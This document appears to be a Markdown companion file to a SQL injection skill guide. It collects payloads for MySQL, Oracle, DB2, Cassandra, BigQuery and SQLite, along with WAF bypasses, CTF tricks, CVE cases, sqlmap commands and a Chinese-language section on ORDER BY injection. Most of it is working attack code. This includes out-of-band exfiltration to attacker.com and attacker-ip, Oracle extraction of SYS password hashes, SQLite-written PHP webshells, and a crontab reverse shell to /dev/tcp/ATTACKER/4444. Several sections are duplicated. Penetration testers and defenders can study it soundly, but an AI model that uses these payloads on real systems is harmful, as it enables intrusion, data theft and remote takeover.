# SQL Injection — Extended Scenarios & Real-World Cases

> Companion to [SKILL.md](SQL注入-SQLInjection.md). Contains additional attack scenarios, CVE case studies, and injection techniques from real-world engagements.

---

## 1. SMB Out-of-Band Exfiltration (MySQL on Windows)

When the MySQL server runs on Windows with outbound SMB allowed:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\share'));
-- Triggers SMB connection → DNS lookup with data in hostname

-- More complete:
SELECT LOAD_FILE(CONCAT('\\\\attacker-ip\\', user(), '\\l.txt'));
-- SMB authentication attempt → attacker captures NTLMv2 hash via Responder
```

**Compared to DNS exfiltration**: SMB exfil can also leak NTLM hashes, enabling offline password cracking. DNS exfil is more reliable across firewalls.

---

## 2. KEY Injection / URI Injection

Beyond GET/POST parameters, SQL injection may occur in less-tested locations:

| Injection Point | Example |
|---|---|
| JSON key names | `{"admin' OR 1=1--": "value"}` — if key is used in column name |
| URI path segments | `/api/users/1 OR 1=1` — if path param enters SQL |
| HTTP headers | `X-Forwarded-For: 127.0.0.1' OR 1=1--` |
| Cookie values | `session=abc' UNION SELECT...` |
| Multipart filename | `filename="test' OR '1'='1.jpg"` |
| ORDER BY from API sort param | `?sort=name;SELECT SLEEP(5)--` |

---

## 3. INSERT / DELETE / UPDATE Injection Differences

Most SQLi training focuses on SELECT. Real applications use INSERT/UPDATE/DELETE with different exploitation strategies:

### INSERT Statement Injection

```sql
-- Original: INSERT INTO logs (user, action) VALUES ('INPUT', 'login');
-- Injection in user field:
INPUT: admin', 'login'), ('attacker', (SELECT password FROM users LIMIT 1))--
-- Result: INSERT INTO logs (user, action) VALUES ('admin', 'login'), ('attacker', 'actual_password')--', 'login');
-- Exfiltrates data into a visible log table
```

### UPDATE Statement Injection

```sql
-- Original: UPDATE users SET email='INPUT' WHERE id=5;
-- Injection: '), admin=1 WHERE username='victim'--
-- Result: UPDATE users SET email=''), admin=1 WHERE username='victim'--' WHERE id=5;
-- Escalates victim's privileges
```

### DELETE Statement Injection

```sql
-- Application's own statement (the injectable sink): DELETE FROM cart WHERE item_id='INPUT' AND user_id=5;
-- Non-destructive proof: confirm injection with a time-based payload, not by widening the WHERE:
-- Injection: 1' AND IF((SELECT 1),SLEEP(5),0)-- 
-- Note: a boolean payload (e.g. 1' OR '1'='1) would match every row (DoS / data destruction) — do not run it against real data.
```

---

## 4. CVE Case: ThinkPHP5 SQL Injection

ThinkPHP5 framework's `where` method improperly handles array parameters:

```
POST /index/think\app/invokefunction
Content-Type: application/x-www-form-urlencoded

function=call_user_func_array&vars[0]=system&vars[1][]=id
```

Error-based extraction using `updatexml`:
```sql
id=1' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)--
```

---

## 5. CVE Case: Django GIS SQL Injection (CVE-2020-9402)

Django's GIS `GeoQuerySet` methods (e.g., `annotate` with `RawSQL`) on Oracle backend allow error-based injection via `utl_inaddr.get_host_name`:

```sql
-- Oracle error-based exfiltration:
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
-- Oracle raises ORA-29257 containing the username in the error message

-- DNS-based out-of-band on Oracle:
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```

**Takeaway**: Oracle-specific functions (`utl_inaddr`, `utl_http`, `dbms_ldap`) are powerful OOB channels that bypass most firewall restrictions.

---

## 6. SQL Injection via Different SQL Verbs

Applications may use different HTTP methods and SQL verbs for the same endpoint:

```text
GET  /api/items?id=1      → SELECT (read)
POST /api/items            → INSERT (create)
PUT  /api/items/1          → UPDATE (modify)
DELETE /api/items/1        → DELETE (remove)

Each verb constructs a different SQL statement.
Test ALL verbs, not just the one shown in the UI.
```

---

## 7. Universal Password Bypass Patterns

```sql
-- Standard:
admin'--
admin' OR 1=1--
' OR '1'='1

-- With parentheses (common in PHP apps):
') OR ('1'='1
') OR 1=1--

-- With comment variations:
admin'/*
admin' OR 1=1#

-- Without quotes (numeric context):
1 OR 1=1
0 OR 1=1
```

---

## 8. DB2 Injection Specifics

DB2 uses distinct syntax and system tables.

### Enumeration
```sql
SELECT versionnumber, version_timestamp FROM sysibm.sysversions
SELECT schemaname FROM syscat.schemata
SELECT inst_name FROM sysibmadm.env_inst_info
SELECT 1 FROM sysibm.sysdummy1   -- equivalent to Oracle DUAL
```

### Blind Injection
```sql
-- Character extraction:
AND ascii(substr((SELECT user FROM sysibm.sysdummy1),1,1)) > 64

-- Row selection (no LIMIT):
SELECT column FROM table FETCH FIRST 1 ROWS ONLY

-- Time-based via Cartesian product (no SLEEP):
AND 1=(SELECT COUNT(*) FROM sysibm.sysdummy1 a, sysibm.sysdummy1 b, sysibm.sysdummy1 c)
```

### Command Execution
```sql
-- IBM i (AS/400) only:
CALL QSYS2.QCMDEXC('COMMAND_HERE')
```

### WAF Bypass
```sql
-- Avoid quotes via chr() concatenation:
chr(65)||chr(68)||chr(77)||chr(73)||chr(78)   -- 'ADMIN'
```

---

## 9. Cassandra Injection Specifics (CQL)

Cassandra Query Language has severe limitations for injection:

### Key Limitations
- No JOIN, no UNION, no subqueries
- No `OR` operator in WHERE clause
- No `SLEEP()` or time-delay function
- No built-in `USER()` function

### Authentication Bypass
```sql
-- Null byte termination:
admin' ALLOW FILTERING; %00

-- Multi-line comment closure:
admin'/*    (in username)
*/and pass>'  (in password)
```

### Comments
```sql
/* multi-line comment */
-- No single-line comment syntax
```

---

## 10. BigQuery Injection Specifics

Google BigQuery uses backtick-quoted identifiers and lacks traditional blind techniques.

### Identification
```sql
-- Backtick syntax is distinctive:
SELECT * FROM `project.dataset.table`

-- System variables:
SELECT @@project_id
```

### Enumeration
```sql
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
-- Fully qualified table names required: project.dataset.table
```

### Error-based
```sql
-- Division by zero:
' OR if(1/(length((select('a')))-1)=1,true,false) OR '
```

### Boolean Blind
```sql
' AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1),1,1)='A' --
```

### Key Notes
- No native `SLEEP()` function for time-based blind
- Comments: `#`, `/* */`
- No stacked queries support

---

## 11. SQLite Injection to RCE

SQLite supports file operations that can escalate to code execution.

### Enumeration
```sql
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='target_table'
SELECT * FROM pragma_table_info('target_table')
```

### Write Webshell via ATTACH DATABASE
```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.cmd (payload text);
INSERT INTO pwn.cmd VALUES ('<?php system($_GET["c"]); ?>');
```

### Write Cron Job
```sql
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS cron;
CREATE TABLE cron.job (payload text);
INSERT INTO cron.job VALUES ('* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

### load_extension (if enabled)
```sql
-- Load shared library for RCE (rarely enabled):
SELECT load_extension('/tmp/evil.so')
-- Windows UNC path variant:
SELECT load_extension('\\attacker\share\evil.dll')
```

### writefile (if available)
```sql
SELECT writefile('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
```

### Error-based
```sql
-- Trigger error via nonexistent function:
CASE WHEN [condition] THEN 1 ELSE load_extension(1) END
```

### Time-based (no SLEEP)
```sql
-- CPU-intensive operation as delay:
AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))
```

---

## 12. WAF Bypass Matrix

### No Spaces Allowed
```sql
/**/UNION/**/SELECT/**/1,2,3
UNION%09SELECT%091,2,3     -- tab character
UNION%0BSELECT%0B1,2,3    -- vertical tab
UNION(SELECT(1),(2),(3))   -- parentheses instead of spaces
```

### No Commas Allowed
```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- CASE/JOIN substitution
SELECT CASE WHEN 1=1 THEN 1 END FROM dual
-- OFFSET instead of comma in LIMIT:
LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- Nested query where inner result becomes part of outer:
1' UNION SELECT 0x2720554e494f4e2053454c454354 -- (hex-encoded second stage)
```

### Second Order Injection
```
Step 1: Register username: admin'--
Step 2: Login as admin'-- (stored in session)
Step 3: Change password → UPDATE users SET password='new' WHERE user='admin'--'
        Effectively changes admin's password
```

---

## 13. CTF-Oriented Techniques

### handler (bypass SELECT filter)
```sql
-- When SELECT is blocked:
handler `table_name` open as a;
handler `a` read next;
handler `a` close;
```

### prepare + hex (bypass keyword filters)
```sql
SET @a=0x73656c65637420757365722829;  -- hex of "select user()"
PREPARE execsql FROM @a;
EXECUTE execsql;
```

### innodb_table_stats (bypass information_schema filter)
```sql
-- When 'information_schema' or 'or' is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
```

### No-column-name Injection
```sql
-- When column names are unknown:
SELECT `3` FROM (SELECT 1,2,3 UNION SELECT * FROM target_table)a LIMIT 1,1
-- Backtick number refers to positional column
```

### Double-write Bypass
```sql
-- When keywords are removed once:
uunionnion sselectelect 1,2,3 ffromrom target
-- After removal: union select 1,2,3 from target
```

### group_concat Alternative
```sql
-- When group_concat is filtered, use GROUP BY with error:
SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x
```

---

## 14. DB2 Injection Specifics

DB2 uses different system catalogs and has unique capabilities:

```sql
-- Version detection
SELECT versionnumber, version_timestamp FROM sysibm.sysversions

-- Current user
SELECT user FROM sysibm.sysdummy1

-- Schema enumeration
SELECT schemaname FROM syscat.schemata
SELECT name, tbname FROM sysibm.syscolumns WHERE tbname='USERS'

-- Blind injection
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END FROM sysibm.sysdummy1
-- Character extraction:
SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1

-- Time-based (Cartesian product amplification)
SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3

-- Command execution (IBM i / AS/400)
CALL QSYS2.QCMDEXC('COMMAND_STRING')

-- WAF bypass: concatenate without quotes
chr(65)||chr(68)||chr(77)||chr(73)||chr(78)
```

---

## 15. Cassandra (CQL) Injection Specifics

Cassandra Query Language has severe limitations compared to SQL:

```
-- Key differences from SQL:
-- * No JOIN, no UNION, no subqueries
-- * No OR operator in WHERE clause
-- * No SLEEP() or time-delay functions
-- * No built-in USER() function
-- * Comments: /* ... */ only

-- Login bypass:
username: admin' ALLOW FILTERING; %00
-- Multi-line comment bypass:
username: admin'/*
password: */and pass>'

-- Boolean extraction via IF() in CQL:
SELECT * FROM users WHERE user='admin' IF EXISTS
```

---

## 16. BigQuery Injection Specifics

Google BigQuery uses backticks and has unique syntax:

```sql
-- Identification: backtick syntax for identifiers
SELECT * FROM `project.dataset.table`

-- System information
SELECT @@project_id

-- Schema enumeration
SELECT * FROM `project.dataset.INFORMATION_SCHEMA.SCHEMATA`
-- Fully qualified: project.dataset.INFORMATION_SCHEMA.TABLES

-- Comments: # and /* */

-- Error-based (division by zero):
' OR if(1/(length((select('a')))-1)=1,true,false) OR '

-- Boolean-based
' AND SUBSTRING((SELECT column FROM dataset.table LIMIT 1),1,1)='A

-- IMPORTANT: No native SLEEP() function
-- No time-based blind injection possible with standard functions

-- UNION template:
' UNION ALL SELECT (SELECT @@project_id),2,3--
```

---

## 17. SQLite Injection to RCE

SQLite has powerful file system interaction capabilities:

```sql
-- Enumeration
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'
SELECT * FROM pragma_table_info('users')

-- Blind injection
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END
-- Hex-based character extraction:
SELECT hex(substr(password,1,1)) FROM users LIMIT 1

-- Error-based
SELECT CASE WHEN [BOOLEAN] THEN 1 ELSE load_extension(1) END

-- Time-based (heavy computation)
SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))

-- RCE via ATTACH DATABASE (write webshell)
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.exp (payload TEXT);
INSERT INTO pwn.exp VALUES ('<?php system($_GET["c"]); ?>');

-- RCE via ATTACH DATABASE (write crontab)
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS pwn;
CREATE TABLE pwn.exp (payload TEXT);
INSERT INTO pwn.exp VALUES ('* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1');

-- RCE via load_extension
-- Compile shared library with init function, then:
SELECT load_extension('/tmp/evil.so','init_func');
-- Windows UNC: SELECT load_extension('\\attacker\share\evil.dll');

-- Write file (if enabled)
SELECT writefile('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
```

---

## 18. CTF SQL Injection Techniques

### handler Bypass (when SELECT is filtered)
```sql
-- MySQL-specific alternative to SELECT:
handler `tablename` open as a;
handler `a` read next;
handler `a` close;
```

### prepare + hex (when keywords are filtered)
```sql
SET @a=0x73656C65637420757365722C70617373776F72642066726F6D207573657273;
-- hex of: select user,password from users
prepare execsql from @a;
execute execsql;
```

### innodb_table_stats (bypass information_schema filter)
```sql
-- When 'information_schema' or 'or' is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
```

### No-column-name injection
```sql
-- When column names are unknown:
SELECT `1` FROM (SELECT 1,2,3 UNION SELECT * FROM users)a
-- Backtick numbers correspond to column positions
```

### Double-write bypass
```sql
-- When keywords are removed once:
uunionnion sselectelect ffromrom
-- After filter removes: union select from
```

### XOR blind injection
```sql
-- When most operators are filtered but ^ remains:
id=1^(ascii(substr((select(flag)from(flag)),1,1))>100)^1
```

### PIPES_AS_CONCAT mode
```sql
-- When || is not filtered:
SET sql_mode=PIPES_AS_CONCAT;
SELECT 1||flag FROM flag
-- || acts as string concatenation instead of OR
```

### Rename/Alter table trick
```sql
-- Rename flag table to match app's expected query:
ALTER TABLE flag RENAME TO words;
ALTER TABLE words ADD COLUMN id INT DEFAULT 1;
-- App query: SELECT * FROM words WHERE id=1 → returns flag data
```

---

## 19. ORDER BY / LIMIT / Sorting Injection（排序位置专项）

排序参数是注入里最容易被漏掉的一类位置：它不在 `WHERE` 里，而在语句末尾。

### 为什么这类位置特殊

- **列名不能参数化**。预编译只能绑定「值」，绑定不了标识符。`ORDER BY ?` / `LIMIT ?` 在多数驱动里直接报错，开发只能拼字符串：`$sql = "SELECT ... ORDER BY {$sort} {$dir}"`。
- **UNION 用不了**。`ORDER BY` 后面没法追加 `UNION SELECT` 扩展结果集，只能走报错注入或盲注。
- **判定逻辑不同**。普通注入看「返回了什么」，排序注入看「顺序有没有变 / 有没有报错 / 有没有延时」——排序不改变返回行数，常规的布尔判断在这里失效。

### 先定位可控的排序参数

| 位置 | 常见参数名 |
|---|---|
| URL 查询串 | `sort` `order` `orderBy` `sortBy` `ordering` `orderField` `sortField` `dir` |
| POST body | 表格列排序字段、`{"sort":"price","order":"desc"}` 这类 JSON |
| 请求头 | `X-Sort` `X-Order` 等自定义头 |
| 路径 | 路径本身含 `/sort/` `/order/` |

第一条验证不用 payload：把值换成一个数字（`sort=1`）。若返回顺序与 `sort=<真实列名>`（如 `sort=id`）一致，说明参数被当作列名拼进了 SQL；若 `sort=1` 正常而 `sort=7` 报错，可顺带枚举出列数。

### 三种判定手法（MySQL）

**报错注入**（页面有报错回显时首选）：

```sql
sort=extractvalue('',concat('>',(select group_concat(table_schema)
       from (select table_schema from information_schema.tables
       group by table_schema) as foo)))
-- 报错回显：XPATH syntax error: '>information_schema,xxx'

sort=updatexml(1,concat(0x7e,(select database())),1)
```

`extractvalue` 的报错回显有长度上限（约 32 字节），长内容用 `substr()` 分段取。

**布尔盲注**（无报错回显、但页面顺序可见）：把条件塞进排序表达式，为真按 A 列排、为假按 B 列排：

```sql
sort=asc,(CASE WHEN (substr(database(),1,1)='a') THEN id ELSE price END)
```

页面顺序随条件变化 → 注入成立，且可逐字符猜解。

**时间盲注**（顺序也看不到时）：

```sql
sort=1,IF((substr(database(),1,1)='a'),SLEEP(3),0)
```

其他库的对应思路：MSSQL 用 `1/(CASE WHEN ... THEN 1 ELSE 0 END)` 触发除零报错，或用 `WAITFOR DELAY`；PostgreSQL 用 `CAST(1/0 AS INT)`；Oracle 走 `ctxsys.drithsx.sn(...)` 报错。先定库再选手法。

`LIMIT` 位置同理：`limit=1,1` 这类分页参数若被直接拼接，注入手法完全一致。

### sqlmap 用法

sqlmap 从 1.4 起对 ORDER BY 位置有支持，但**必须显式指定参数**，否则在参数多的接口上容易漏：

```bash
# 明确指向排序参数
sqlmap -u "http://target/api/products?sort=id&order=asc" -p "sort,order" --batch --dbs

# 盲注场景限定技术，减少无谓请求
sqlmap -u "http://target/api/products?sort=1" -p sort --technique B --batch --dbs
sqlmap -u "http://target/api/products?sort=1" -p sort --technique T --time-sec=2 --batch --dbs

# 有 WAF 时挂 tamper
sqlmap -u "http://target/api/products?sort=1" -p sort --tamper=space2comment,between
```

已知漏报场景：框架自定义拼接（如 `order[0][dir]` 这类嵌套参数名）、列名带表前缀、参数被二次编码。这些情况要按上面的手法人工确认。

### 真实例

CVE-2021-32615（Piwigo 相册系统）：后台用户管理页的 POST body 里有 `order[0][dir]=asc`，传入单引号触发 MySQL 语法报错，确认注入点在 `ORDER BY`；因 UNION 不可用，最终用 `extractvalue` 报错注入取出库表名。

### 防御写法（写报告修复建议用）

`ORDER BY` 子句在多数数据库驱动里不支持参数化，唯一正解是**白名单**：

```java
private static final Set<String> ALLOWED_COLUMNS = Set.of("price", "sales", "create_time", "id");
private static final Set<String> ALLOWED_DIRECTIONS = Set.of("ASC", "DESC");
// 传入值不在白名单内 → 回落到默认排序，不拼接
```

黑名单、转义、过滤关键字都不算修复。

### 边界提醒

排序位置的布尔 payload 不会扩大结果集，但也不要拿 `OR 1=1` 这类宽条件去试探生产数据；验证以「最小化可复现」为准，确认后即停。
